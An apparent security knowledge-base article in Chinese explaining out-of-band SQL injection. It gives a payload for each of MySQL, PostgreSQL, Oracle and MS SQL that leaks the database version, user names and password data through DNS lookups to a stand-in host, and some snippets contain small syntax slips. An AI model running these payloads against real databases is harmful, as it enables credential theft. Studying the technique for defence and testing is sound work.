---
title: 带外SQL注入
date: 2026-05-03
summary: 带外SQL注入（OOB SQLi）是SQL注入的一种，攻击者不会在同一通信通道上收到来自受攻击应用程序的响应，而是能够使应用程序将数据发送到远程端点，远程端点由攻击者控制。
tags: 漏洞库, Web安全, SQL注入
cover: app-blue
readingTime: 6 分钟
featured: false
---
# 带外SQL注入

### 什么是带外SQL注入

带外SQL注入（OOB SQLi）是SQL注入的一种，攻击者不会在同一通信通道上收到来自受攻击应用程序的响应，而是能够使应用程序将数据发送到远程端点，远程端点由攻击者控制。

带外 SQL 注入仅在您使用的服务器具有触发 DNS 或 HTTP 请求的命令时才有可能。 然而，所有流行的SQL服务器都是这种情况。

<br>

### 带外SQL注入示例

#### In MySQL

如果MySQL数据库服务器的 `secure_file_priv` 全局系统变量没有值时，MySQL服务器 5.5.52 及以下版本（以及 MariaDB 分支）的默认情况，攻击者可以窃取数据，然后使用 `load_file` 函数创建对域名的请求，将泄露的数据放入请求中。

| secure_file_priv值  |  效果      |
|--------------------|---------|
| NULL | 表示限制mysql不允许导入或导出 |
| /tmp|表示限制mysql只能在/tmp目录中执行导入导出，其他目录不能执行|
|没有值时|表示不限制mysql在任意目录的导入导出|

<br>

假设恶意攻击者能够在目标数据库中执行以下 SQL 查询：

<font color="#00dddd">SELECT</font> load_file(<font color="#00dddd">CONCAT</font>('\\\\\\\\',(<font color="#00dddd">SELECT</font>+@@version),'.',(<font color="#00dddd">SELECT</font>+user),'.', (<font color="#00dddd">SELECT</font>+password),'.',example.com\\\\test.txt'))

<br>

这将导致应用程序向域 `database_version.database_user.database_password.example.com` 发送 DNS 请求，将敏感数据（数据库版本、用户名和用户密码）暴露给攻击者。

<br>

#### In PostgreSQL

如果应用程序使用的是 `PostgreSQL` 数据库，则以下 SQL 查询可获得与上述相同的结果：

<font color="#00dddd">DROP TABLE IF EXISTS</font> table_output;<br>
<font color="#00dddd">CREATE TABLE</font> table_output(content text);<br>
<font color="#00dddd">CREATE</font> OR <font color="#00dddd">REPLACE FUNCTION</font> temp_function()<font color="#00dddd">RETURNS VOID AS</font> $$ <font color="#00dddd">DECLARES</font> exec_cmd <font color="#00dddd">TEXT</font>;<br>
<font color="#00dddd">DECLARE</font> query_result_version <font color="#00dddd">TEXT</font>;<br>
<font color="#00dddd">DECLARE</font> query_result_user <font color="#00dddd">TEXT</font>;<br>
<font color="#00dddd">DECLARE</font> query_result_password <font color="#00dddd">TEXT</font>;<br>
<font color="#00dddd">BEGIN</font><br>
&nbsp;&nbsp;<font color="#00dddd">SELECT INTO</font> query_result_version (<font color="#00dddd">SELECT</font> current_setting('server_version'));<br>
&nbsp;&nbsp;<font color="#00dddd">SELECT INTO</font> query_result_user (<font color="#00dddd">SELECT</font> usename <font color="#00dddd">FROM</font> pg_shadow);<br>
&nbsp;&nbsp;<font color="#00dddd">SELECT INTO</font> query_result_password (<font color="#00dddd">SELECT</font> passwd <font color="#00dddd">FROM</font> pg_shadow);<br>
&nbsp;&nbsp;exec_cmd := E<font color="#00dd00">'COPY table_output(content)<br>
&nbsp;&nbsp;&nbsp;&nbsp;FROM E\\'\\\\\\\\\\\\\\\\'</font>||query_result_version||'.'||query_result_user||'.'||query_result_password||E'.example.com\\\\\\\\test.txt\\'';<br>
&nbsp;&nbsp;<font color="#00dddd">EXECUTE</font> exec_cmd;<br>
<font color="#00dddd">END</font>;<br>
\$\$ <font color="#00dddd">LANGUAGE</font> plpgsql SECURITY <font color="#00dddd">DEFINER</font>;<br>
<font color="#00dddd">SELECT</font> temp_function();<br>

在这种情况下，罪魁祸首是 PostgreSQL 中的 `COPY` 函数，该函数旨在在文件和表之间移动数据。 在这里，它允许攻击者包含一个远程文件作为复制源。

<br>

#### In Oracle

如果应用程序使用的是 Oracle 数据库，则以下 SQL 查询可获得与上述相同的结果：

<font color="#00dddd">SELECT</font> DBMS_LDAP.INIT(<br>

&nbsp;&nbsp;&nbsp;(<font color="#00dddd">SELECT</font> version FROM v$instance)||<font color="#00dddd">'.'</font>||<br>

&nbsp;&nbsp;&nbsp;(<font color="#00dddd">SELECT user FROM</font> dual)||<font color="#00dddd">'.'</font>||<br>

&nbsp;&nbsp;&nbsp;(<font color="#00dddd">SELECT</font> name FROM v$<font color="#00dddd">database</font>)||<font color="#00dddd">'.'</font>||example.com' ,<font color="#c92c2c">80</font>) <font color="#00dddd">FROM</font> dual;<br>

在这种情况下，由于 DBMS_LDAP PL/SQL 包中的 init() 函数，带外SQL注入（OOB SQLi）成为可能。但是，这并不是唯一可用于向远程端点发出请求的 `Oracle` 包。 例如，您还可以使用 `UTL_HTTP` 包中的 `REQUEST` 函数。

#### In MS SQL

如果应用程序使用的是 `MS SQL` 数据库，则以下 SQL 查询会获得与上述相同的结果（但没有密码）：

<font color="#00dddd">DECLARE</font> @a <font color="#00dddd">varchar</font>(1024);<br>
<font color="#00dddd">DECLARE</font> @b <font color="#00dddd">varchar</font>(1024);<br>
<font color="#00dddd">SELECT</font> @a = (<font color="#00dddd">SELECT system_user</font>);<br>
<font color="#00dddd">SELECT</font> @b = (<font color="#00dddd">SELECT</font> DB_Name()); <br>
<font color="#00dddd">EXEC</font>(<font color="#00dd00">'master..xp_dirtree"\\\\'</font>+@a+<font color="#00dd00">''</font>+<font color="#00dd00">'.'</font>+<font color="#00dd00">''</font>+@b+<font color="#00dd00">'example.com\test$"'</font>);<br>

由于 xp_dirtree 存储过程，带外SQL注入（OOB SQLi）成为可能。 虽然最初用于列出本地目录树，但它可以被诱骗导致 DNS 查找。
